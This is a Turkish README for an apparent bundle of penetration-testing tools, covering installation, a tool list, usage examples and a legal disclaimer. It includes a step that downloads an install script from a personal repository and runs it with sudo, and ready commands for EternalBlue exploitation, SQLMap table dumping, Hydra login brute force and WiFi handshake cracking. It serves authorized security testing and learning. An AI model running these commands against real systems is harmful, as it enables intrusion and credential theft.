# 🔐 Kapsamlı Güvenlik Araçları Paketi

## 📋 İçindekiler

- [Hızlı Başlangıç](#hızlı-başlangıç)
- [Kurulum Seçenekleri](#kurulum-seçenekleri)
- [Araçlar Listesi](#araçlar-listesi)
- [Kullanım Örnekleri](#kullanım-örnekleri)
- [Yasal Uyarılar](#yasal-uyarılar)

---

## 🚀 Hızlı Başlangıç

### Option 1: Otomatik Kurulum (Önerilen)

```bash
# Script'i indirin
wget https://raw.githubusercontent.com/memetcanwq31-ship-it/https-github.com-wordsploit/main/install.sh

# Çalıştırın
sudo bash install.sh
```

### Option 2: Docker Kullanımı

```bash
# Docker image oluştur
docker build -t security-tools .

# Container başlat
docker run -it security-tools
```

### Option 3: Manuel Kurulum

Bakınız: [TOOLS_INSTALLATION.md](TOOLS_INSTALLATION.md)

---

## 📦 Kurulum Seçenekleri

### İşletim Sistemi Desteği

| OS | Statü | Kurulum |
|----|-------|--------|
| Kali Linux | ✅ | `sudo bash install.sh` |
| Ubuntu/Debian | ✅ | `sudo bash install.sh` |
| CentOS/RHEL | ⚠️ | Manuel kurulum gerekli |
| Windows (WSL2) | ✅ | WSL2 + Linux kurulumu |
| Mac (Intel) | ⚠️ | Docker öneriliyor |
| Mac (Apple Silicon) | ⚠️ | Docker öneriliyor |

---

## 🛠️ Araçlar Listesi

### Keşif (Reconnaissance)
- **Nmap** - Port ve servis taraması
- **Mr Holmes** - OSINT araştırması
- **TheHarvester** - Email ve subdomain
- **SubList3r** - Subdomain enumeration
- **Recon-ng** - Gelişmiş keşif framework

### Web Uygulamaları
- **Burp Suite** - Web proxy ve tarayıcı
- **SQLMap** - SQL injection otomasyonu
- **Nikto** - Web sunucu taraması
- **Gobuster** - Dizin ve DNS brute force
- **wafw00f** - WAF tespit
- **dirsearch** - Dizin keşfi
- **commix** - Command injection

### Ağ Analizi
- **Wireshark** - Paket analizi ve sniffer
- **Tcpdump** - Terminal ağ analizörü
- **Nmap** - Ağ mapping
- **Masscan** - Hızlı port tarayıcı
- **Responder** - LLMNR/NBT-NS yanıtlayıcı

### Şifre Testleri
- **Hydra** - Kimlik bilgisi brute force
- **John the Ripper** - Hash kırma
- **Hashcat** - GPU hash kırma
- **Aircrack-ng** - WiFi şifre kırma

### WiFi Testleri
- **Aircrack-ng** - WiFi keşfi ve kırma
- **Airmon-ng** - Monitor modu
- **Airodump-ng** - Ağ taraması

### Exploit ve Payload
- **Metasploit Framework** - Exploit framework
- **Empire** - Powershell framework
- **msfvenom** - Payload oluşturma

### OSINT
- **Mr Holmes** - Email reconnaissance
- **TheHarvester** - Bilgi toplama
- **Shodan** - IoT arama

---

## 📚 Kullanım Örnekleri

### Nmap ile Network Scanning

```bash
# Hızlı tarama
nmap 192.168.1.0/24

# Detaylı tarama
nmap -sV -A -O 192.168.1.100

# UDP portları
nmap -sU 192.168.1.100

# Dosyaya kaydet
nmap -sV -A 192.168.1.100 -oN results.txt
```

### Metasploit ile Exploitation

```bash
# Msfconsole başlat
msfconsole

# Exploit ara
search ms17_010

# Exploit kullan
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set LHOST 192.168.1.50
run
```

### SQLMap ile SQL Injection

```bash
# Veritabanı listele
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Tablo dump
sqlmap -u "http://example.com/page.php?id=1" -D database --tables

# Veri çek
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### Hydra ile Brute Force

```bash
# SSH
hydra -l admin -P rockyou.txt 192.168.1.100 ssh

# HTTP
hydra -L users.txt -P pass.txt http://example.com/login

# FTP
hydra -L users.txt -P pass.txt ftp://192.168.1.100
```

### Aircrack-ng ile WiFi Kırma

```bash
# Monitor modu aç
sudo airmon-ng start wlan0

# Ağları tara
sudo airodump-ng wlan0mon

# Handshake yakala
sudo airodump-ng -c 6 -bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Şifre kır
aircrack-ng -w rockyou.txt capture-01.cap
```

### Burp Suite ile Web Testing

```bash
1. Burp Suite açın: burpsuite
2. Proxy ayarla: 127.0.0.1:8080
3. Browser proxy'sini yapılandır
4. İstekleri yakala ve düzenle
5. Scanner ile tarama yapıştır
```

---

## 🔍 Hızlı Referans

### Kurulum Sonrası Yapılacaklar

```bash
# Alias'ları yükle
source ~/.bashrc

# Araçlar dizinine git
tools-dir

# Metasploit veritabanını kontrol et
msfdb status

# Wordlist kontrol
ls ~/security-tools/wordlists/
```

### Sık Kullanılan Komutlar

```bash
# IP adresi göster
myip          # Dış IP
localip       # Yerel IP

# Port kontrol
check-port example.com 80

# Dosya çıkart
extract file.zip

# Hash kontrol
hash-md5
hash-sha256
```

---

## 📖 Öğrenme Kaynakları

### Resmi Dokümantasyon
- [Metasploit Academy](https://www.offensive-security.com/)
- [Kali Linux](https://www.kali.org/)
- [Burp Suite](https://portswigger.net/burp)
- [OWASP](https://owasp.org/)

### Online Platformlar
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [OverTheWire](https://overthewire.org/)
- [PentesterLab](https://pentesterlab.com/)

### Türkçe Kaynaklar
- [BTK Akademi](https://www.btkakademi.gov.tr/)
- [Siber Güvenlik Kursu](https://www.udemy.com/)

---

## ⚠️ YASAL UYARLAR

### ✅ LEGAL KULLANIM
- ✔️ Kendi sistemleri test etme
- ✔️ Yetkili penetration testing
- ✔️ Eğitim ve öğrenme
- ✔️ Etik hackerlik sertifikaları
- ✔️ Bug bounty programları
- ✔️ CTF (Capture The Flag) yarışmaları

### ❌ YASAL OLMAYAN KULLANIM
- ❌ İzinsiz sistem erişimi
- ❌ Veri hırsızlığı ve kullanımı
- ❌ DDoS saldırıları
- ❌ Kötü amaçlı yazılım yayınlaması
- ❌ Kimlik hırsızlığı
- ❌ Finansal dolandırıcılık

### Sorumluluk Reddi
Bu araçlar yalnızca eğitim ve yasal güvenlik testleri için sağlanmıştır. Kullanıcı, bu araçları kullanırken tüm yasal sorumluluğu üstlenir. Yazarlar herhangi bir kötü amaçlı kullanımdan sorumlu değildir.

---

## 🆘 Sorun Giderme

### Kurulum sorunları

```bash
# Paketleri güncelle
sudo apt update
sudo apt upgrade -y

# Belirli paketi yeniden kur
sudo apt install --reinstall package-name

# Bağımlılık sorunları
sudo apt --fix-broken install
```

### Metasploit sorunları

```bash
# Veritabanını sıfırla
msfdb delete
msfdb init

# PostgreSQL kontrol
sudo systemctl status postgresql
sudo systemctl restart postgresql
```

### Nmap kurulum hatası

```bash
sudo apt-get install -y build-essential
sudo apt-get install nmap
```

### Aircrack-ng sorunları

```bash
# Wireless kartı kontrol et
iwconfig

# WiFi aç
sudo rfkill unblock wifi

# Monitor modu iptal et
sudo airmon-ng stop wlan0mon
```

---

## 📞 Destek

Sorularınız veya sorunlarınız için:

1. **GitHub Issues**: Bu repository'de issue açın
2. **Resmi Dokümantasyon**: Her aracın resmi docsunu kontrol edin
3. **Community Forums**: 
   - Kali Linux Forums
   - Metasploit Discord
   - StackOverflow

---

## 📄 Lisans

Bu proje eğitim amaçlı olup, kullanılan araçların kendi lisanslarına tabidir.

---

**Son Güncelleme**: 2026-05-06

⭐ Bu projeyi faydalı buldum ise star verin!
🐛 Sorun buldum ise issue açın!
🔧 İyileştirme önerileriniz için PR gönderin!
